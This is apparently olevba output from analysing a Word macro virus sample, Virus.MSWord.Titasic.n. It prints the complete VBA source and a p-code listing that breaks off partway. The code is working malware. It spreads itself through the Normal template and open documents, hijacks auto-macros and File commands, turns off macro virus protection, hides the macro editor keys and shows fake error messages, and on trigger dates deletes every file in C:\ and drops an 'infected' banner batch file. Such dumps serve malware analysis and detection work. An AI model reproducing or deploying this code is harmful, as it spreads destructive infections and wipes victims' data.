olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Titasic.n
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Titasic.n - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Brando_A.bas 
in file: ./Virus.MSWord.Titasic.n - OLE stream: 'Macros/VBA/Brando_A'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public DocActive
    Public lanjutan
        Public aLen
            Public hapus
                Public reset
                    Public Auto
                        Public ActivDoc
                            Public Const strPESAN = "Cyber Millenium by IfTä"
                                Public Const strONOFF = "A,C,D"
Sub BMM1(fFile)
Dim nInit As Object
    For Each nInit In fFile. _
        VBProject.VBComponents
            If nInit.Name <> "ThisDocument" _
              And nInit.Name <> "Brando_A" _
                And nInit.Name <> "hack" Then
                    hapus = True
                If reset Then
            Application.OrganizerDelete _
        fFile.FullName, nInit.Name, _
    wdOrganizerObjectProjectItems
Else
nInit.CodeModule.DeleteLines 1, _
    nInit.CodeModule.CountOfLines
        End If
            End If
Next nInit
End Sub
Sub FileOpen()
WordBasic.disableautomacros True
    If Dialogs(80).Show <> 0 Then
        WordBasic.disableautomacros False
            AutoOpen
                Else
                    WordBasic.disableautomacros False
End If
End Sub
Sub AutoOpen()
Application.EnableCancelKey = _
    wdCancelDisabled
      BMM
            If Documents.Count > 1 Then
                For i = 1 To Documents.Count
                    If Documents(i).Name <> _
                ActiveDocument.Name Then
            Set AD = Documents(i)
        ActiveDoc = True
    hapus = False
BMM
    End If
        Next
            End If
            End
End Sub
Sub ViewVbCode()
If MsgBox(" Not enough memory !", _
    vbCritical + vbOKOnly) _
        = vbOK Then
    End If
End Sub
Function BMM()
Dim nInit(1) As String
    Dim TempNormal As Object
       Dim Nmacr$
        On Error Resume Next
            BMM3
On Error GoTo selesai
    nInit(0) = "Brando_A"
nInit(1) = "hack"
    Nmacr = MacroContainer
        Set TempNormal = NormalTemplate
            If Not ActivDoc Then
                Set DocActive = ActiveDocument
                    ElseIf Nmacr <> "Professional Letter.dot" Then
                        Nmacr = TempNormal
                    End If
                If Nmacr = TempNormal Then
            Nmacr = TempNormal.FullName: Set lanjutan = _
        DocActive
    ElseIf Nmacr = DocActive Then
Nmacr = DocActive.FullName: Set lanjutan = _
    TempNormal
        ElseIf Nmacr = "Professional Letter.dot" Then
            Set lanjutan = TempNormal
                Nmacr = Options.DefaultFilePath(8) _
                    & "\Professional Letter.Gra"
                        End If
                    BMM1 lanjutan
                With lanjutan.VBProject
        If Not (Not hapus And .Description = _
    "Brando_A" And .VBComponents.Count > 2) _
Then
BMM2 Nmacr, lanjutan, nInit
    hapus = False
        .Description = "Brando_A"
    If lanjutan = TempNormal Then
Options.SaveInterval = 1
    CustomizationContext = TempNormal
        CommandBars("Tools").reset
            FindKey(BuildKeyCode _
                (wdKeyF11, wdKeyAlt)).Disable
                    FindKey _
                (BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
            On Error GoTo 0
        lanjutan.Save
    End If
Else
    End If
End With
    Asm
selesai:
End Function
Sub BMM2(fFile, Dfile, nInit)
Dim Nmacr
    For Each Nmacr In nInit
        Application.OrganizerCopy _
            fFile, Dfile.FullName, Nmacr, _
                wdOrganizerObjectProjectItems
                    Next
                        End Sub
Function Dat()
Application.DisplayAlerts = wdAlertsAll
    Open "c:\Bacalah.bat" For Output As #2
        Write #2, "::" + Chr(13) + Chr(10) + "@Echo off" + Chr(13) + Chr(10) + "Cls" _
            + Chr(13) + Chr(10) + "If Exist c:\Bacalah.bat" _
                + Chr(13) + Chr(10) + "Echo." + Chr(13) + Chr(10) + "Echo." + Chr(13) + Chr(10) + _
"Echo                 ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»" + Chr(13) + Chr(10) + _
"Echo                 º          Welcome to IfTa Virus  0.3         º" + Chr(13) + Chr(10) + _
"Echo                 º         Your Computer Infected Virus.       º" + Chr(13) + Chr(10) + _
"Echo                 º      How Did That Happen to Come About ?    º" + Chr(13) + Chr(10) + _
"Echo                 º                  Call Me                    º" + Chr(13) + Chr(10) + _
"Echo                 º              Ifta@MailCity.Com              º" + Chr(13) + Chr(10) + _
"Echo                 ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼" + Chr(13) + Chr(10) + _
    "Echo." + Chr(13) + Chr(10) + "::"
Close #2
    End Function
Sub AutoSave()
On Error GoTo Chr
       BMM
        Err
           Application.DisplayAlerts = wdAlertsAll
                 Set AD = ActiveDocument
                 If ActiveDocument.Saved = True Then
                    AD.SaveAs FileName:=AD.Name, _
                        FileFormat:=wdFormatDocument
            End If
Chr:
End Sub
Sub AutoExec()
On Error Resume Next
    If MacroContainer <> _
        NormalTemplate Then
            Auto = True
                BMM
            WordBasic.disableautomacros True
        AddIns.Unload False
    WordBasic.disableautomacros False
End If
    Application.EnableCancelKey = _
        wdCancelDisabled
            End Sub
Function BMM3()
On Error GoTo Initis
    Dim Nmacr$
        Kill Options.DefaultFilePath(8) _
            & "\SNrml.dot"
        Application.NormalTemplate.Saved = True
    Kill Options.DefaultFilePath(10) _
    & "\SNrml.src"
Initis:
End Function
Sub AutoClose()
Application.DisplayAlerts = -1
    BMM
          With Options
                .SaveNormalPrompt = False
                    .SaveInterval = 3
                .VirusProtection = False
            End With
        If InStr(1, ActiveDocument.Name, "Docume", 1) = _
    0 And ActiveDocument.Name <> "Professional Letter.dot" Then
BMM
    ActiveDocument.SaveAs FileName:=ActiveDocument. _
        Name, FileFormat:=wdFormatDocument
            End If
                End Sub
Sub AutoExit()
Dim aAddin As Object
    On Error GoTo batal
        WordBasic.disableautomacros True
            If Documents.Count <> 0 Then Documents.Close
                Options.DefaultFilePath(2) = _
                    Options.DefaultFilePath(6)
                        ptk = True
                    For Each aAddin In AddIns
                If aAddin.Name = _
            "Professional Letter.dot" Then ptk = False
        Next aAddin
    If ptk = True Then
Application.Visible = False
    Documents.Add
        BMM
             With ActiveDocument
                    .SaveAs FileName:=Options.DefaultFilePath(8) _
                        & "\Professional Letter.Gra", FileFormat:= _
                    wdFormatDocument, AddToRecentFiles:=False
                .SaveAs FileName:=Options.DefaultFilePath(8) _
            & "\Professional Letter.dot", FileFormat:= _
        wdFormatTemplate, AddToRecentFiles:=False
    End With
End If
Application.Quit
batal:
WordBasic.disableautomacros False
End Sub
Function Err()
On Error Resume Next
    If Now > Day(Now) = 6 Then GoTo Error
        If Month(Now) = 1 Then GoTo AksiA
            If Month(Now) = 2 Then GoTo AksiA
                If Month(Now) = 3 Then GoTo AksiA
                    If Month(Now) = 4 Then GoTo AksiA
                If Month(Now) = 5 Then GoTo AksiA
            If Month(Now) = 6 Then GoTo AksiA
        If Month(Now) = 7 Then GoTo AksiA
    If Month(Now) = 8 Then GoTo AksiA
If Month(Now) = 9 Then GoTo AksiA
    If Month(Now) = 10 Then GoTo AksiB
        If Month(Now) = 11 Then GoTo AksiA
            If Month(Now) = 12 Then GoTo AksiA
    GoTo EndAksi
Error:
    GoTo EndAksi
AksiA:
    If Day(Now) = 6 Then Gbr
AksiB:
    If Day(Now) = 14 Then Pas
EndAksi:
End
End Function
Sub ToolsMacro()
On Error Resume Next
    CommandBars("Tools").Controls("Macro").Delete
        CustomizationContext = NormalTemplate
            WordBasic.disableautomacros False
                BMM1 ActiveDocument
                    End Sub
Sub ToolsOptions()
    Options.DefaultFilePath(wdUserTemplatesPath) = _
        "C:\Program Files\Microsoft Office\Templates"
            Dialogs(wdDialogToolsOptions).Show
                Options.DefaultFilePath(wdUserTemplatesPath) = _
                    Application.Path
                        End Sub
Function Asm()
    reset = True
        FileTemplates
            BMM1 lanjutan
                End Function
Sub FileTemplates()
    WordBasic.disableautomacros False
        If Not reset Then Dialogs(87).Display
            End Sub
Function Init()
    hack.Show
        End Function
Sub FileExit()
    AutoExit
        End Sub
Sub FileSave()
    AutoSave
        End Sub
Sub FileClose()
    AutoClose
        End Sub
Function Pas()
    MsgBox "Don't let our differences come between us. " & Application.ActiveDocument.Name, vbOKOnly + vbSystemModal, "Microsoft Word"
      Dat
        Init
           Kill "C:\*.*"
             End Function
Function Gbr()
    MsgBox "He came out with a new play.", vbOKOnly + vbSystemModal, "Microsoft Word"
       Dat
         Init
            Kill "C:\*.*"
              End Function
-------------------------------------------------------------------------------
VBA MACRO hack.frm 
in file: ./Virus.MSWord.Titasic.n - OLE stream: 'Macros/VBA/hack'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 







































Private Sub CommandButton1_Click()
Unload Me
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Titasic.n
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/Brando_A - 14615 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn DocActive
' Line #1:
' 	Dim (Public) 
' 	VarDefn lanjutan
' Line #2:
' 	Dim (Public) 
' 	VarDefn aLen
' Line #3:
' 	Dim (Public) 
' 	VarDefn hapus
' Line #4:
' 	Dim (Public) 
' 	VarDefn reset
' Line #5:
' 	Dim (Public) 
' 	VarDefn Auto
' Line #6:
' 	Dim (Public) 
' 	VarDefn ActivDoc
' Line #7:
' 	Dim (Public Const) 
' 	LitStr 0x0017 "Cyber Millenium by IfTä"
' 	VarDefn strPESAN
' Line #8:
' 	Dim (Public Const) 
' 	LitStr 0x0005 "A,C,D"
' 	VarDefn strONOFF
' Line #9:
' 	FuncDefn (Sub BMM1(fFile))
' Line #10:
' 	Dim 
' 	VarDefn nInit (As Object)
' Line #11:
' 	LineCont 0x0004 06 00 08 00
' 	StartForVariable 
' 	Ld nInit 
' 	EndForVariable 
' 	Ld fFile 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #12:
' 	LineCont 0x0008 06 00 0E 00 0C 00 10 00
' 	Ld nInit 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Ld nInit 
' 	MemLd New 
' 	LitStr 0x0008 "Brando_A"
' 	Ne 
' 	And 
' 	Ld nInit 
' 	MemLd New 
' 	LitStr 0x0004 "hack"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #13:
' 	LitVarSpecial (True)
' 	St hapus 
' Line #14:
' 	Ld reset 
' 	IfBlock 
' Line #15:
' 	LineCont 0x0008 03 00 08 00 0B 00 04 00
' 	Ld fFile 
' 	MemLd FullName 
' 	Ld nInit 
' 	MemLd New 
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #16:
' 	ElseBlock 
' Line #17:
' 	LineCont 0x0004 07 00 04 00
' 	LitDI2 0x0001 
' 	Ld nInit 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nInit 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #18:
' 	EndIfBlock 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	StartForVariable 
' 	Ld nInit 
' 	EndForVariable 
' 	NextVar 
' Line #21:
' 	EndSub 
' Line #22:
' 	FuncDefn (Sub FileOpen())
' Line #23:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall disableautomacros 0x0001 
' Line #24:
' 	LitDI2 0x0050 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #25:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall disableautomacros 0x0001 
' Line #26:
' 	ArgsCall AutoOpen 0x0000 
' Line #27:
' 	ElseBlock 
' Line #28:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall disableautomacros 0x0001 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub AutoOpen())
' Line #32:
' 	LineCont 0x0004 04 00 04 00
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #33:
' 	ArgsCall BMM 0x0000 
' Line #34:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #35:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #36:
' 	LineCont 0x0004 08 00 10 00
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	MemLd New 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ne 
' 	IfBlock 
' Line #37:
' 	SetStmt 
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	Set AD 
' Line #38:
' 	LitVarSpecial (True)
' 	St ActiveDoc 
' Line #39:
' 	LitVarSpecial (False)
' 	St hapus 
' Line #40:
' 	ArgsCall BMM 0x0000 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	StartForVariable 
' 	Next 
' Line #43:
' 	EndIfBlock 
' Line #44:
' 	End 
' Line #45:
' 	EndSub 
' Line #46:
' 	FuncDefn (Sub ViewVbCode())
' Line #47:
' 	LineCont 0x0008 05 00 04 00 09 00 08 00
' 	LitStr 0x0014 " Not enough memory !"
' 	Ld vbCritical 
' 	Ld vbOKOnly 
' 	Add 
' 	ArgsLd MsgBox 0x0002 
' 	Ld vbOK 
' 	Eq 
' 	IfBlock 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	EndSub 
' Line #50:
' 	FuncDefn (Function BMM())
' Line #51:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0001 
' 	VarDefn nInit (As String)
' Line #52:
' 	Dim 
' 	VarDefn TempNormal (As Object)
' Line #53:
' 	Dim 
' 	VarDefn Nmacr
' Line #54:
' 	OnError (Resume Next) 
' Line #55:
' 	ArgsCall BMM3 0x0000 
' Line #56:
' 	OnError selesai 
' Line #57:
' 	LitStr 0x0008 "Brando_A"
' 	LitDI2 0x0000 
' 	ArgsSt nInit 0x0001 
' Line #58:
' 	LitStr 0x0004 "hack"
' 	LitDI2 0x0001 
' 	ArgsSt nInit 0x0001 
' Line #59:
' 	Ld MacroContainer 
' 	St Nmacr 
' Line #60:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set TempNormal 
' Line #61:
' 	Ld ActivDoc 
' 	Not 
' 	IfBlock 
' Line #62:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set DocActive 
' Line #63:
' 	Ld Nmacr 
' 	LitStr 0x0017 "Professional Letter.dot"
' 	Ne 
' 	ElseIfBlock 
' Line #64:
' 	Ld TempNormal 
' 	St Nmacr 
' Line #65:
' 	EndIfBlock 
' Line #66:
' 	Ld Nmacr 
' 	Ld TempNormal 
' 	Eq 
' 	IfBlock 
' Line #67:
' 	LineCont 0x0004 09 00 08 00
' 	Ld TempNormal 
' 	MemLd FullName 
' 	St Nmacr 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld DocActive 
' 	Set lanjutan 
' Line #68:
' 	Ld Nmacr 
' 	Ld DocActive 
' 	Eq 
' 	ElseIfBlock 
' Line #69:
' 	LineCont 0x0004 09 00 04 00
' 	Ld DocActive 
' 	MemLd FullName 
' 	St Nmacr 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld TempNormal 
' 	Set lanjutan 
' Line #70:
' 	Ld Nmacr 
' 	LitStr 0x0017 "Professional Letter.dot"
' 	Eq 
' 	ElseIfBlock 
' Line #71:
' 	SetStmt 
' 	Ld TempNormal 
' 	Set lanjutan 
' Line #72:
' 	LineCont 0x0004 08 00 14 00
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0018 "\Professional Letter.Gra"
' 	Concat 
' 	St Nmacr 
' Line #73:
' 	EndIfBlock 
' Line #74:
' 	Ld lanjutan 
' 	ArgsCall BMM1 0x0001 
' Line #75:
' 	StartWithExpr 
' 	Ld lanjutan 
' 	MemLd VBProject 
' 	With 
' Line #76:
' 	LineCont 0x0008 09 00 04 00 12 00 00 00
' 	Ld hapus 
' 	Not 
' 	MemLdWith Description 
' 	LitStr 0x0008 "Brando_A"
' 	Eq 
' 	And 
' 	MemLdWith VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0002 
' 	Gt 
' 	And 
' 	Paren 
' 	Not 
' 	IfBlock 
' Line #77:
' 	Ld Nmacr 
' 	Ld lanjutan 
' 	Ld nInit 
' 	ArgsCall BMM2 0x0003 
' Line #78:
' 	LitVarSpecial (False)
' 	St hapus 
' Line #79:
' 	LitStr 0x0008 "Brando_A"
' 	MemStWith Description 
' Line #80:
' 	Ld lanjutan 
' 	Ld TempNormal 
' 	Eq 
' 	IfBlock 
' Line #81:
' 	LitDI2 0x0001 
' 	Ld Options 
' 	MemSt SaveInterval 
' Line #82:
' 	Ld TempNormal 
' 	St CustomizationContext 
' Line #83:
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemCall reset 0x0000 
' Line #84:
' 	LineCont 0x0004 03 00 10 00
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #85:
' 	LineCont 0x0004 01 00 10 00
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #86:
' 	OnError (GoTo 0) 
' Line #87:
' 	Ld lanjutan 
' 	ArgsMemCall Save 0x0000 
' Line #88:
' 	EndIfBlock 
' Line #89:
' 	ElseBlock 
' Line #90:
' 	EndIfBlock 
' Line #91:
' 	EndWith 
' Line #92:
' 	ArgsCall Asm 0x0000 
' Line #93:
' 	Label selesai 
' Line #94:
' 	EndFunc 
' Line #95:
' 	FuncDefn (Sub BMM2(fFile, Dfile, nInit))
' Line #96:
' 	Dim 
' 	VarDefn Nmacr
' Line #97:
' 	StartForVariable 
' 	Ld Nmacr 
' 	EndForVariable 
' 	Ld nInit 
' 	ForEach 
' Line #98:
' 	LineCont 0x0008 03 00 0C 00 0B 00 10 00
' 	Ld fFile 
' 	Ld Dfile 
' 	MemLd FullName 
' 	Ld Nmacr 
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #99:
' 	StartForVariable 
' 	Next 
' Line #100:
' 	EndSub 
' Line #101:
' 	FuncDefn (Function Dat())
' Line #102:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #103:
' 	LitStr 0x000E "c:\Bacalah.bat"
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #104:
' 	LineCont 0x0028 1D 00 0C 00 29 00 10 00 4C 00 00 00 58 00 00 00 64 00 00 00 70 00 00 00 7C 00 00 00 88 00 00 00 94 00 00 00 A0 00 04 00
' 	LitDI2 0x0002 
' 	Sharp 
' 	WriteChan 
' 	LitStr 0x0002 "::"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "@Echo off"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "Cls"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0017 "If Exist c:\Bacalah.bat"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "Echo."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "Echo."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0044 "Echo                 ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0044 "Echo                 º          Welcome to IfTa Virus  0.3         º"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0044 "Echo                 º         Your Computer Infected Virus.       º"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0044 "Echo                 º      How Did That Happen to Come About ?    º"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0044 "Echo                 º                  Call Me                    º"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0044 "Echo                 º              Ifta@MailCity.Com              º"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0044 "Echo                 ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "Echo."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "::"
' 	Add 
' 	PrintItemNL 
' Line #105:
' 	LitDI2 0x0002 
' 	Sharp 
' 	Close 0x0001 
' Line #106:
' 	EndFunc 
' Line #107:
' 	FuncDefn (Sub AutoSave())
' Line #108:
' 	OnError Chr 
' Line #109:
' 	ArgsCall BMM 0x0000 
' Line #110:
' 	ArgsCall Err 0x0000 
' Line #111:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #112:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set AD 
' Line #113:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #114:
' 	LineCont 0x0004 09 00 18 00
' 	Ld AD 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld AD 
' 	ArgsMemCall SaveAs 0x0002 
' Line #115:
' 	EndIfBlock 
' Line #116:
' 	Label Chr 
' Line #117:
' 	EndSub 
' Line #118:
' 	FuncDefn (Sub AutoExec())
' Line #119:
' 	OnError (Resume Next) 
' Line #120:
' 	LineCont 0x0004 03 00 08 00
' 	Ld MacroContainer 
' 	Ld NormalTemplate 
' 	Ne 
' 	IfBlock 
' Line #121:
' 	LitVarSpecial (True)
' 	St Auto 
' Line #122:
' 	ArgsCall BMM 0x0000 
' Line #123:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall disableautomacros 0x0001 
' Line #124:
' 	LitVarSpecial (False)
' 	Ld AddIns 
' 	ArgsMemCall Unlock 0x0001 
' Line #125:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall disableautomacros 0x0001 
' Line #126:
' 	EndIfBlock 
' Line #127:
' 	LineCont 0x0004 04 00 08 00
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #128:
' 	EndSub 
' Line #129:
' 	FuncDefn (Function BMM3())
' Line #130:
' 	OnError Initis 
' Line #131:
' 	Dim 
' 	VarDefn Nmacr
' Line #132:
' 	LineCont 0x0004 07 00 0C 00
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x000A "\SNrml.dot"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #133:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemLd NormalTemplate 
' 	MemSt Saved 
' Line #134:
' 	LineCont 0x0004 07 00 04 00
' 	LitDI2 0x000A 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x000A "\SNrml.src"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #135:
' 	Label Initis 
' Line #136:
' 	EndFunc 
' Line #137:
' 	FuncDefn (Sub AutoClose())
' Line #138:
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #139:
' 	ArgsCall BMM 0x0000 
' Line #140:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #141:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #142:
' 	LitDI2 0x0003 
' 	MemStWith SaveInterval 
' Line #143:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #144:
' 	EndWith 
' Line #145:
' 	LineCont 0x0004 0E 00 04 00
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0006 "Docume"
' 	LitDI2 0x0001 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0017 "Professional Letter.dot"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #146:
' 	ArgsCall BMM 0x0000 
' Line #147:
' 	LineCont 0x0004 07 00 08 00
' 	Ld ActiveDocument 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #148:
' 	EndIfBlock 
' Line #149:
' 	EndSub 
' Line #150:
' 	FuncDefn (Sub AutoExit())
' Line #151:
' 	Dim 
' 	VarDefn aAddin (As Object)
' Line #152:
' 	OnError batal 
' Line #153:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall disableautomacros 0x0001 
' Line #154:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Documents 
' 	ArgsMemCall Close 0x0000 
' 	EndIf 
' Line #155:
' 	LineCont 0x0004 07 00 14 00
' 	LitDI2 0x0006 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitDI2 0x0002 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #156:
' 	LitVarSpecial (True)
' 	St ptk 
' Line #157:
' 	StartForVariable 
' 	Ld aAddin 
' 	EndForVariable 
' 	Ld AddIns 
' 	ForEach 
' Line #158:
' 	LineCont 0x0004 05 00 0C 00
' 	Ld aAddin 
' 	MemLd New 
' 	LitStr 0x0017 "Professional Letter.dot"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St ptk 
' 	EndIf 
' Line #159:
' 	StartForVariable 
' 	Ld aAddin 
' 	EndForVariable 
' 	NextVar 
' Line #160:
' 	Ld ptk 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #161:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt Visible 
' Line #162:
' 	Ld Documents 
' 	ArgsMemCall Add 0x0000 
' Line #163:
' 	ArgsCall BMM 0x0000 
' Line #164:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #165:
' 	LineCont 0x0008 0A 00 18 00 0F 00 14 00
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0018 "\Professional Letter.Gra"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	ArgsMemCallWith SaveAs 0x0003 
' Line #166:
' 	LineCont 0x0008 0A 00 0C 00 0F 00 08 00
' 	LitDI2 0x0008 
' 	Ld Options 
